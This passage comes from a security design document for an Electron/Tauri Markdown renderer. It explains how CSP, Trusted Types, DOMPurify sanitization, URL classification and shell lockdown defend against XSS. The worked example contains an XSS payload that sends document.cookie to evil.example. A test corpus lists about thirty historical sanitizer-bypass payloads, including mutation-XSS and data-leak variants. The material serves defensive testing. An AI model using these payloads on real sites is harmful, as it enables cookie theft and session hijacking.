What our CSP buys us even if the sanitizer is bypassed:

| Directive | Blocks |
|-----------|--------|
| `script-src 'self'` (no `unsafe-inline`, no `unsafe-eval`) | inline `<script>`, `eval`, string-constructed handlers |
| `require-trusted-types-for 'script'` | **entire classes of DOM XSS** — OWASP: "It is one of the few controls that eliminates entire classes of DOM XSS rather than mitigating them." Sinks reject plain strings; everything must go through a vetted policy (DOMPurify can *be* that policy) |
| `object-src 'none'` | `<object>`, `<embed>` |
| `base-uri 'none'` | `<base href>` rewriting every relative URL in the document — the DOMPurify threat model calls `base` a "landmine" because one tag "rewrites **every** relative URL in the document" |
| `form-action 'none'` | form submission |
| `frame-src 'none'` | `<iframe>` |
| `img-src` narrow list | remote image exfiltration and, more importantly, `img-src 'none'` would also break our own images, so we allow `asset:`/`http://asset.localhost` and `data:` and **nothing else** |

Trusted Types is worth the effort. Setup:

```js
if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input, SANITIZE_CONFIG),
  });
}
```

With that, a bare `el.innerHTML = attackerString` **throws** instead of executing.
Note DOMPurify's constraint: to create the policy, `RETURN_TRUSTED_TYPE: false`
is required, because `createHTML` expects a normal string.

### 8.4 Other layers

| Layer | Where | Note |
|-------|-------|------|
| Navigation lockdown | `will-navigate`, `setWindowOpenHandler`, `shell.openExternal` allowlist | Electron checklist: "Disable or limit navigation", "Disable or limit creation of new windows", "Do not use `shell.openExternal` with untrusted content" |
| Capability/permission model | Tauri's capabilities | Tauri docs are blunt that capabilities "do not protect against malicious or insecure Rust code" or "0-days or unpatched 1-days in the system WebView" |
| Sandboxing | `sandbox: true` | Electron: "Loading, reading or processing any untrusted content in an unsandboxed process, including the main process, is not advised" |
| Protocol registration | custom scheme instead of `file://` | Electron: "Avoid usage of the `file://` protocol and prefer usage of custom protocols" |

All of that is [11-security/02-webview-sandboxing.md](../11-security/02-webview-sandboxing.md).

---

## 9. Worked example: one payload, six layers

The document:

````markdown
# Report

<img src=x onerror="fetch('https://evil.example/?d='+document.cookie)">

[Click me](javascript:alert(document.domain))

<a href="#" onclick="alert(1)">trap</a>

<svg><foreignObject><xmp><img src=y onerror=alert(2)></xmp></foreignObject></svg>

[md](vbscript:msgbox(1)) [x](data:text/html,<script>alert(3)</script>)

<pre><img src=z onerror=alert(4)></pre>

<table><tr><td width=1 onmouseover="alert(5)">cell</table>
````

### Layer 0 — the parser (CommonMark)

Faithfully produces: an `htmlBlock` for the `<img …>` line, a `link` node whose
destination is `javascript:alert(document.domain)`, an `htmlInline` for
`<a …>`, an `htmlBlock` for the `<svg>…`, links with `vbscript:` and `data:`
destinations, an `htmlBlock` (CommonMark type 1, started by `<pre`) for the
`<pre><img …>` line, and a table with a cell whose HTML content includes
`onmouseover`.

No error. This is a valid CommonMark document.

### Layer 1 — our renderer (stage 5)

Emits, escaping text and attributes per §3 of
[01-ast-to-html.md](./01-ast-to-html.md#3-escaping-rules):

```html
<h1 id="h-report">Report</h1>
<img src="x" onerror="fetch('https://evil.example/?d='+document.cookie)">
<p><a href="javascript:alert(document.domain)">Click me</a></p>
<a href="#" onclick="alert(1)">trap</a>
<svg><foreignObject><xmp><img src=y onerror=alert(2)></xmp></foreignObject></svg>
<p><a href="vbscript:msgbox(1)">md</a> <a href="data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;">x</a></p>
<pre><img src=z onerror=alert(4)></pre>
<table><thead><tr><th>cell</th></tr></thead><tbody><tr><td width="1" onmouseover="alert(5)">cell</td></tr></tbody></table>
```

The only escaping visible is inside the `data:` href — `<` and `>` became
`&lt;`/`&gt;`, which prevents *breaking out of the attribute*. It does **not**
make the URL safe; that is the next layer's job. This distinction is the most
common misunderstanding in the whole pipeline: **escaping and URL validation are
different controls and neither substitutes for the other.**

### Layer 2 — the sanitizer (DOMPurify)

```ts
DOMPurify.sanitize(dirty, SANITIZE_CONFIG);
```

What happens, element by element:

| Input | Verdict | Why |
|-------|---------|-----|
| `<img src="x" onerror=…>` | `<img src="x" alt="">` | `onerror` not in attribute allowlist; `alt` added by DOMPurify |
| `<a href="javascript:…">` | `<a>Click me</a>` | `href` **kept as an attribute** but its value fails the URI check, so the attribute is dropped; the link text survives. This is exactly the behaviour the DOMPurify docs describe for the tight allowlist recipe |
| `<a href="#" onclick="…">` | `<a href="#">trap</a>` | `onclick` denied; `href="#"` is a relative fragment, allowed |
| `<svg>…` | **removed entirely** | `USE_PROFILES: { html: true }` — no SVG profile, so no `svg`, `foreignObject`, or `xmp` |
| `href="vbscript:…"` | attribute dropped | scheme not in allowlist |
| `href="data:text/html,…"` | attribute dropped | `data:` only for the four raster image types |
| `<pre><img src=z onerror=…></pre>` | `<pre><img src="z" alt=""></pre>` | `onerror` denied; note `<img>` is allowed *inside* `<pre>` — which is semantically odd but harmless, and stripping it would violate "keep text" |
| `width="1" onmouseover="…"` | `width` dropped (not in `td` allowlist), `onmouseover` dropped | both denied |

Result:

```html
<h1 id="h-report">Report</h1>
<img src="x" alt="">
<p><a>Click me</a></p>
<a href="#">trap</a>
<p><a>md</a> <a>x</a></p>
<pre><img src="z" alt=""></pre>
<table><thead><tr><th>cell</th></tr></thead><tbody><tr><td>cell</td></tr></tbody></table>
```

### Layer 3 — URL classification (ours, linear, separate)

Runs on `href`/`src` **before** the sanitizer, as part of media resolution, and
again as an assertion after. It contributes a second, independent verdict: even
if DOMPurify's URI regex were wrong, `classifyUrl('javascript:…')` returns
`blocked` and we replace the `href` with `#` (so the link stays visible but
inert) rather than dropping the text.

### Layer 4 — CSP (Tauri/Electron config)

Had any of the above failed:

- A surviving `<script>` would be blocked by `script-src 'self'` — there is no
  `'unsafe-inline'` and no `'unsafe-eval'`.
- A surviving `onerror=` handler would be blocked by
  `require-trusted-types-for 'script'` (with Trusted Types installed, the
  `innerHTML` assignment throws) and by CSP's implicit script restriction on
  inline event handlers.
- A surviving `fetch('https://evil.example/…')` would be blocked by
  `connect-src ipc: http://ipc.localhost` — the document cannot phone home.
- A surviving `<base href="https://evil.example/">` would be blocked by
  `base-uri 'none'`.
- A surviving `<iframe>` by `frame-src 'none'`; `<object>` by
  `object-src 'none'`.

### Layer 5 — the shell

- A surviving `javascript:` navigation is caught by
  `will-navigate` → `event.preventDefault()`.
- `setWindowOpenHandler` denies every `window.open`.
- `shell.openExternal` is called only for URLs that passed `classifyUrl`, from
  our own click handler — never from `href` passthrough.
- The renderer is sandboxed, context-isolated, and `nodeIntegration: false`.

### What each layer bought

| Layer alone | Result with the payload |
|-------------|------------------------|
| Escaping only | `<a href="javascript:…">` still fires. Escaping is not URL validation. |
| URL validation only | `<img onerror>` still fires. No `javascript:` needed. |
| Tag allowlist only | `<a href="javascript:…">` survives — `a` is allowed. |
| Sanitizer alone | Payload is dead. But `img src="//evil.example/px.gif"` still leaks. |
| Sanitizer + CSP | Payload dead **and** no remote fetch, no inline script, no `base` hijack. |
| Sanitizer + CSP + shell lockdown | Payload dead, no exfiltration, no navigation, and a compromised renderer still cannot reach Node. |

**The point of the table:** no single layer is sufficient. This is OWASP's
defense-in-depth argument and it is the argument for
[11-security/05-security-baseline-recommendations.md](../11-security/05-security-baseline-recommendations.md)
being a hard gate rather than a wish list.

---

## 10. Sanitizer test corpus (must exist before v0.1 ships)

Every item is a real historical bypass class. Each is asserted against the
**live DOM after insertion**, in Chromium, via Playwright, not against the
returned string.

| # | Payload | Assert |
|---|---------|--------|
| 1 | `<img src=x onerror=alert(1)>` | no `[onerror]` |
| 2 | `<svg><g/onload=alert(2)//<p>` | no `svg` in DOM |
| 3 | `<p>abc<iframe//src=jAva&Tab;script:alert(3)>def</p>` | no `iframe` |
| 4 | `<math><mi//xlink:href="data:x,<script>alert(4)</script>">` | no `math` |
| 5 | `<TABLE><tr><td>HELLO</tr></TABL>` | structural repair, still inert |
| 6 | `<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>` | no `[onerror]` |
| 7 | `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>` | no `[onerror]` |
| 8 | `<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>` | no `[onerror]`, no `style` |
| 9 | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | no `[onerror]` |
| 10 | `<textarea><p title="</textarea><img src=x onerror=alert(1)>">` | no `[onerror]` |
| 11 | `<a href="jav&#x09;ascript:alert(1)">x</a>` | no `href` starting with `jav` |
| 12 | `<a href=" java\nscript:alert(1)">x</a>` | no `href` |
| 13 | `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>` | no `href` |
| 14 | `<a href="data:image/svg+xml;base64,...">` | no `href` |
| 15 | `<img src="x" name="getElementById">` | `SANITIZE_DOM` removed or `name` denied |
| 16 | `<form><input name=attributes></form>` | no `form`, no `input[name=attributes]` |
| 17 | `<base href="https://evil.example/">` | no `base` |
| 18 | `<meta http-equiv="refresh" content="0;url=https://evil.example">` | no `meta` |
| 19 | `<style>*{background:url(https://evil.example/leak)}</style>` | no `style` element |
| 20 | `<div style="background:url(https://evil.example/leak)">` | no `style` attribute |
| 21 | `<iframe srcdoc="<img src=x onerror=alert(1)>">` | no `iframe` |
| 22 | `<template><img src=x onerror=alert(1)></template>` | no `template` |
| 23 | `<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>` | no `[onerror]`, no `selectedcontent` |
| 24 | `<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>` | no `[onerror]` |
| 25 | 8192-deep `<svg>` nesting wrapping `<style><img src=x onerror=alert(1)></style>` | sanitizes within a time bound; no `[onerror]`; no stack overflow |
| 26 | `<a href="#x" target="_blank">` | `rel="noopener noreferrer"` present or `target` stripped |
| 27 | heading `# __proto__` | no prototype pollution; slug map has null prototype |
| 28 | `<img src="data:image/png;base64,<2 MB>" alt="big">` | allowed |
| 29 | `<img src="data:image/png;base64,<20 MB>" alt="toobig">` | rejected with a placeholder, no OOM |
| 30 | `<a href="//evil.example/x">` | rejected or normalized to our own scheme |

Fixtures 1–5 are verbatim from
[DOMPurify's own README](https://github.com/cure53/DOMPurify); 6–12, 22–25 are
from its
[Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-%26-Bypass-History);
13–21, 26–30 are our own, derived from the threat models above.

## Sources

- OWASP Cross Site Scripting Prevention Cheat Sheet —
  <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP DOM based XSS Prevention Cheat Sheet —
  <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- OWASP Application Security Verification Standard 5.0.0, ch. 1 "Encoding and
  Sanitization" — <https://asvs.dev/>
- DOMPurify README — <https://github.com/cure53/DOMPurify>
- DOMPurify Security Goals & Threat Model —
  <https://github.com/cure53/DOMPurify/wiki/Security-Goals-%26-Threat-Model>
- DOMPurify Attack Classes & Bypass History —
  <https://github.com/cure53/DOMPurify/wiki/Attack-Classes-%26-Bypass-History>
- `sanitize-html` defaults and design — <https://github.com/apostrophecms/sanitize-html>
- `html-pipeline` SanitizationFilter (GitHub's allowlist) —
  <https://github.com/gjtorikian/html-pipeline/blob/main/lib/html_pipeline/sanitization_filter.rb>
- `markdown-it` safety notes — <https://github.com/markdown-it/markdown-it/blob/master/docs/safety.md>
- CommonMark 0.31.2 §4.6 HTML blocks — <https://spec.commonmark.org/0.31.2/#html-blocks>
- Electron security checklist — <https://www.electronjs.org/docs/latest/tutorial/security>
- Tauri CSP — <https://v2.tauri.app/security/csp/>
- Michał Bentkowski, mutation XSS via MathML (DOMPurify 2.0.17) —
  <https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/>
- Gareth Heyes, bypassing DOMPurify with mutation XSS —
  <https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss>
- PortSwigger, DOM Clobbering strikes back —
  <https://portswigger.net/research/dom-clobbering-strikes-back>
- Unicode UAX #9 bidirectional algorithm — <https://www.unicode.org/reports/tr9/>
